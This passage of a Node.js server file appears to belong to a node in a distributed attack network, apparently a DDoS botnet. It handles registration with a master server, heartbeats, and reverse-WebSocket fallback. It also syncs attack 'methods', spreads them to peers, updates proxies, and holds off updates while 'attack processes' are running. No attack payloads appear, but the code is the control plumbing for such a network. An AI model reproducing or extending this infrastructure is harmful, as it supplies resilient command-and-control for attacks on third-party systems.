            `[READY] Node ready - Mode: ${nodeMode}, Registered: ${isRegistered}`
          );
          console.log('='.repeat(80) + '\n');
        } else {
          console.log(
            '[REVERSE] ⚠ REST registration failed:',
            registerResult.error
          );
          console.log(
            '[REVERSE] Will retry via WebSocket messages'
          );
        }
      } catch (error) {
        console.error(
          '[REVERSE] ✗ REST registration error:',
          error.message
        );
      }
    } else if (connectionCheckAttempts >= maxConnectionCheckAttempts) {
      clearInterval(setupInterval);
      console.log(
        '[REVERSE] ✗ WebSocket connection timeout, will retry in 10 seconds...'
      );
      setTimeout(
        () => startReverseMode(heartbeatInterval, methodsSyncInterval),
        10000
      );
    } else if (connectionCheckAttempts % 5 === 0) {
      console.log(
        `[REVERSE] ⏳ Waiting for connection... (${connectionCheckAttempts}/${maxConnectionCheckAttempts})`
      );
    }
  }, 1000);
}

function startStandaloneMode() {
  console.log('\n' + '='.repeat(80));
  console.log('[INIT] STARTING STANDALONE MODE - No master connection');
  console.log('='.repeat(80));

  setTimeout(async () => {
    try {
      console.log('[STANDALONE] Performing local methods sync...');
      const syncResult = await syncMethods();
      if (syncResult && syncResult.success) {
        console.log('[STANDALONE] ✓ Methods sync completed');
        console.log(
          `[STANDALONE] Methods count: ${Object.keys(
            sharedData.methodsConfig
          ).length}`
        );
      }

      console.log('\n' + '='.repeat(80));
      console.log('[READY] Node ready in STANDALONE mode');
      console.log(
        `[READY] Methods: ${Object.keys(sharedData.methodsConfig).length}`
      );
      console.log('='.repeat(80) + '\n');
    } catch (error) {
      console.error(
        '[STANDALONE] ✗ Sync error:',
        error.message
      );
    }
  }, 2000);
}

function startHeartbeatService(heartbeatInterval) {
  if (heartbeatModule.startBackgroundHeartbeat) {
    backgroundHeartbeat =
      heartbeatModule.startBackgroundHeartbeat(heartbeatInterval);
    backgroundHeartbeat.start();
    console.log(
      `[HEARTBEAT] Background heartbeat started (every ${heartbeatInterval}ms)`
    );
  } else {
    heartbeatIntervalId = setInterval(() => {
      const isEncrypted =
        encryptionManager && encryptionInitialized && config.ENCRYPTION?.ENABLED;

      const sendFn = isEncrypted
        ? heartbeatModule.sendEncryptedHeartbeat
        : heartbeatModule.sendHeartbeat;

      sendFn
        .call(heartbeatModule)
        .catch((err) => console.error('[HEARTBEAT] Error:', err.message));
    }, heartbeatInterval);
    console.log(
      `[HEARTBEAT] Interval heartbeat started (every ${heartbeatInterval}ms)`
    );
  }
}

// Periodic sync setelah REGISTRASI
function startPeriodicP2PSync(methodsSyncInterval) {
  if (!methodsSyncInterval || methodsSyncInterval <= 0) {
    console.log(
      '[PERIODIC-SYNC] Invalid interval, skipping periodic sync'
    );
    return;
  }

  methodsSyncIntervalId = setInterval(async () => {
    if (!isRegistered) {
      console.log('[PERIODIC-SYNC] Skipped - not registered');
      return;
    }

    // ── ATTACK GUARD ────────────────────────────────────────────────────────
    if (isAttackInProgress()) {
      const activeCount = executor.getActiveProcessesCount();
      console.log(
        `[PERIODIC-SYNC] ⚠ Skipped — ${activeCount} active attack process(es) running. ` +
        `Sync deferred until attack completes.`
      );
      return;
    }
    // ────────────────────────────────────────────────────────────────────────

    try {
      const syncResult = await syncMethods();
      if (syncResult && syncResult.success && !syncResult.up_to_date) {
        console.log('[PERIODIC-SYNC] Methods updated');

        if (heartbeatModule?.updateMethodsVersion) {
          await heartbeatModule.updateMethodsVersion();
        }
      }
    } catch (error) {
      console.error('[PERIODIC-SYNC] Error:', error.message);
    }
  }, methodsSyncInterval);
  console.log(
    `[PERIODIC-SYNC] P2P-based periodic sync started (every ${methodsSyncInterval}ms)`
  );
}

async function retryRegistration(heartbeatInterval, methodsSyncInterval) {
  console.log('\n' + '='.repeat(80));
  console.log('[INIT] 🔄 RETRYING REGISTRATION...');
  console.log('='.repeat(80));

  if (!heartbeatModule) {
    console.error('[INIT] ✗ Heartbeat module not available for retry');
    return;
  }

  try {
    if (
      typeof heartbeatModule !== 'object' ||
      typeof heartbeatModule.autoRegister !== 'function'
    ) {
      console.error(
        '[INIT] ✗ Heartbeat module is invalid for retry!',
        typeof heartbeatModule
      );
      console.error(
        '[INIT] Available keys:',
        Object.keys(heartbeatModule || {})
      );

      if (config.MASTER?.WS_URL && config.REVERSE?.ENABLE_AUTO) {
        console.log(
          '[INIT] Switching to REVERSE mode after validation failure'
        );
        nodeMode = 'REVERSE';
        sharedData.setNodeMode('REVERSE');
        startReverseMode(heartbeatInterval, methodsSyncInterval);
      }
      return;
    }

    const retryResult = await heartbeatModule.autoRegister();

    if (retryResult.success) {
      console.log('='.repeat(80));
      console.log('[INIT] ✅ REGISTRATION SUCCESSFUL ON RETRY');
      console.log('='.repeat(80));
      isRegistered = true;
      sharedData.setRegistered(true);

      if (heartbeatIntervalId) clearInterval(heartbeatIntervalId);
      if (methodsSyncIntervalId) clearInterval(methodsSyncIntervalId);

      startDirectMode(heartbeatInterval, methodsSyncInterval);
    } else {
      console.log('='.repeat(80));
      console.log(
        '[INIT] ✗ REGISTRATION RETRY FAILED:',
        retryResult.error
      );
      console.log('='.repeat(80));
      console.log(
        '[INIT] Will retry again in 60 seconds...\n'
      );

      if (config.MASTER?.WS_URL && config.REVERSE?.ENABLE_AUTO) {
        console.log(
          '[INIT] Switching to REVERSE mode after multiple failures'
        );
        nodeMode = 'REVERSE';
        sharedData.setNodeMode('REVERSE');
        startReverseMode(heartbeatInterval, methodsSyncInterval);
      } else {
        setTimeout(
          () => retryRegistration(heartbeatInterval, methodsSyncInterval),
          60000
        );
      }
    }
  } catch (error) {
    console.error('[INIT] ✗ Error in retryRegistration:', error);
    console.error('[INIT] Stack trace:', error.stack);

    if (config.MASTER?.WS_URL && config.REVERSE?.ENABLE_AUTO) {
      console.log(
        '[INIT] Falling back to REVERSE mode after error...'
      );
      nodeMode = 'REVERSE';
      sharedData.setNodeMode('REVERSE');
      startReverseMode(heartbeatInterval, methodsSyncInterval);
    }
  }
}

// ======================
// GRACEFUL SHUTDOWN
// ======================
function gracefulShutdown(signal) {
  console.log(`\n[SHUTDOWN] Received ${signal}. Shutting down gracefully...`);

  if (heartbeatIntervalId) {
    clearInterval(heartbeatIntervalId);
    heartbeatIntervalId = null;
  }
  if (methodsSyncIntervalId) {
    clearInterval(methodsSyncIntervalId);
    methodsSyncIntervalId = null;
  }

  if (proxyUpdater?.stopAutoUpdate) {
    proxyUpdater.stopAutoUpdate();
  }
  if (backgroundHeartbeat?.stop) {
    backgroundHeartbeat.stop();
  }
  if (backgroundWSHeartbeat?.stop) {
    backgroundWSHeartbeat.stop();
  }
  if (p2pNode) {
    try {
      p2pNode.shutdown();
    } catch (e) {
      console.error(
        '[SHUTDOWN] Error shutting down P2P node:',
        e.message
      );
    }
  }
  if (reverseClient?.shutdown) {
    try {
      reverseClient.shutdown();
    } catch (e) {
      console.error(
        '[SHUTDOWN] Error shutting down reverse client:',
        e.message
      );
    }
  }
  if (executor?.cleanup) {
    executor.cleanup();
  } else if (executor) {
    const killed = executor.killAllProcesses();
    console.log(`[SHUTDOWN] Killed ${killed} active processes`);
  }

  console.log('[SHUTDOWN] Cleanup completed');

  fastify.close(() => {
    console.log('[SHUTDOWN] Fastify closed');
    process.exit(0);
  });

  setTimeout(() => {
    console.log('[SHUTDOWN] Force exit');
    process.exit(0);
  }, 5000);
}

// ======================
// START SERVER
// ======================
async function startServer() {
  try {
    await fastify.listen({ port: config.SERVER.PORT, host: '0.0.0.0' });

    console.log('\n' + '='.repeat(80));
    console.log('NODE SERVER STARTED');
    console.log('='.repeat(80));
    console.log(`Port: ${config.SERVER.PORT}`);
    console.log(`Node ID: ${config.NODE.ID}`);
    console.log(
      `Encryption: ${
        config.ENCRYPTION?.ENABLED ? 'ENABLED' : 'DISABLED'
      }`
    );
    console.log('='.repeat(80) + '\n');

    // Load initial methods config (local only)
    refreshMethodsConfig();
    console.log(
      `[INIT] Loaded ${Object.keys(sharedData.methodsConfig).length} methods (local)`
    );

    // Init P2P Hybrid Node (sebelum registrasi, tapi tidak sync dulu)
    if (config.P2P?.ENABLED) {
      try {
        console.log('[P2P] Initializing P2P Hybrid Node...');
        p2pNode = new P2PHybridNode(
          config,
          executor,
          sharedData.methodsConfig
        );
        sharedData.setP2PNode(p2pNode);

        if (encryptionManager) {
          p2pNode.setEncryptionManager(encryptionManager);
        }

        const p2pStarted = await p2pNode.startP2PServer(fastify);
        if (p2pStarted) {
          console.log('[P2P] ✓ P2P Hybrid Node started successfully');

          p2pNode.on('peer_connected', (data) => {
            console.log(
              `[P2P-EVENT] Peer connected: ${data.nodeId} (${data.mode} - ${
                data.direct ? 'direct' : 'relay'
              })`
            );
          });

          p2pNode.on('peer_disconnected', (data) => {
            console.log(
              `[P2P-EVENT] Peer disconnected: ${data.nodeId}`
            );
          });

          p2pNode.on('peer_info', (data) => {
            console.log(
              `[P2P-EVENT] Peer info received from ${data.nodeId}`
            );
          });

          // Methods updated from peer
          p2pNode.on(
            'methods_updated_from_peer',
            async (data) => {
              // ── ATTACK GUARD ─────────────────────────────────────────────
              if (isAttackInProgress()) {
                const activeCount = executor.getActiveProcessesCount();
                console.log(
                  `[P2P-EVENT] ⚠ Methods update from peer ${data.nodeId} deferred — ` +
                  `${activeCount} active attack process(es) running.`
                );
                return;
              }
              // ─────────────────────────────────────────────────────────────

              console.log(
                `[P2P-EVENT] Methods updated from peer ${data.nodeId}, saving and propagating IMMEDIATELY...`
              );

              try {
                const normalizedMethods = data.methods;

                if (
                  !normalizedMethods ||
                  Object.keys(normalizedMethods).length === 0
                ) {
                  console.error(
                    '[P2P-EVENT] Received empty methods from peer, skipping'
                  );
                  return;
                }

                const methodsPath = config.SERVER.METHODS_PATH;
                fs.writeFileSync(
                  methodsPath,
                  JSON.stringify(normalizedMethods, null, 2)
                );
                console.log('[P2P-EVENT] ✓ Methods saved to local file');

                // Update shared config
                refreshMethodsConfig();
                console.log('[P2P-EVENT] ✓ Shared config updated');

                // Notify master (fire-and-forget)
                if (heartbeatModule?.updateMethodsVersion) {
                  heartbeatModule
                    .updateMethodsVersion()
                    .then(() => {
                      console.log(
                        '[P2P-EVENT] ✓ Master notified of version update'
                      );
                    })
                    .catch((error) => {
                      console.error(
                        '[P2P-EVENT] Failed to notify master:',
                        error.message
                      );
                    });
                }

                // Propagate to other peers
                if (p2pNode && p2pNode.peers.size > 0) {
                  setImmediate(() => {
                    const propagated =
                      p2pNode.propagateMethodsUpdateImmediate(
                        data.nodeId,
                        data.methodsVersion
                      );
                    console.log(
                      `[P2P-EVENT] ✓ Propagated to ${propagated} additional peer(s) with ZERO delay`
                    );
                  });
                }
              } catch (error) {
                console.error(
                  '[P2P-EVENT] Failed to save/propagate methods:',
                  error.message
                );
              }
            }
          );
        } else {
          console.log('[P2P] ✗ Failed to start P2P Hybrid Node');
        }
      } catch (error) {
        console.error(
          '[P2P] Error initializing P2P:',
          error.message
        );
      }
    } else {
      console.log('[P2P] P2P is disabled in config');
    }

    // Initialize proxy updater (tidak auto-start sampai registrasi sukses)
    if (config.PROXY?.AUTO_UPDATE) {
      try {
        proxyUpdater = createProxyUpdater(config);
        sharedData.setProxyUpdater(proxyUpdater);
        console.log(
          '[PROXY] Proxy updater initialized (will start after registration)'
        );
      } catch (error) {
        console.error('[PROXY] Init error:', error.message);
      }
    }

    // Initialize modules (encryption + heartbeat + test koneksi master)
    const masterReachable = await initializeModules();

    if (!masterReachable && config.MASTER?.URL) {
      console.log(
        '[INIT] WARNING: Cannot reach master, will try REVERSE mode if WS available'
      );
    }

    // Test encryption
    if (config.ENCRYPTION?.ENABLED && encryptionManager && encryptionInitialized) {
      try {
        const testResult = encryptionManager.testEncryption();
        console.log(
          `[ENCRYPTION-TEST] ${
            testResult.success ? 'PASSED' : 'FAILED'
          }`
        );
        if (!testResult.success && testResult.error) {
          console.error(
            `[ENCRYPTION-TEST] Error: ${testResult.error}`
          );
        }
      } catch (error) {
        console.error(
          '[ENCRYPTION-TEST] Error:',
          error.message
        );
      }
    }

    const heartbeatInterval =
      config.MASTER?.HEARTBEAT_INTERVAL || 30000;
    const methodsSyncInterval =
      config.MASTER?.METHODS_SYNC_INTERVAL || 120000;

    // Tentukan network mode (DIRECT / REVERSE)
    const modeInfo = await determineNetworkMode();
    nodeMode = modeInfo.mode;
    sharedData.setNodeMode(nodeMode);
    isReachable = modeInfo.reachable;
    sharedData.setReachable(isReachable);

    // Set mode di P2P node
    if (p2pNode) {
      p2pNode.setNodeMode(nodeMode);
    }

    console.log(
      `[INIT] Final mode: ${nodeMode}, Reachable: ${isReachable}`
    );

    // Mulai operasi berbasis mode:
    // -> di dalamnya: REGISTER DULU, baru jalanin heartbeat, sync, proxy updater, periodic sync.
    startModeBasedOperations(heartbeatInterval, methodsSyncInterval);

    await fetchServerInfo().catch(() => {});
  } catch (err) {
    console.error('Failed to start server:', err);
    process.exit(1);
  }
}

// ======================
// SIGNAL HANDLERS
// ======================
process.on('SIGINT', () => gracefulShutdown('SIGINT'));
process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('uncaughtException', (error) => {
  console.error('[FATAL] Uncaught Exception:', error);
  gracefulShutdown('UNCAUGHT_EXCEPTION');
});
process.on('unhandledRejection', (reason, promise) => {
  console.error(
    '[FATAL] Unhandled Rejection at:',
    promise,
    'reason:',
    reason
  );
  gracefulShutdown('UNHANDLED_REJECTION');
});

// Start the server
startServer();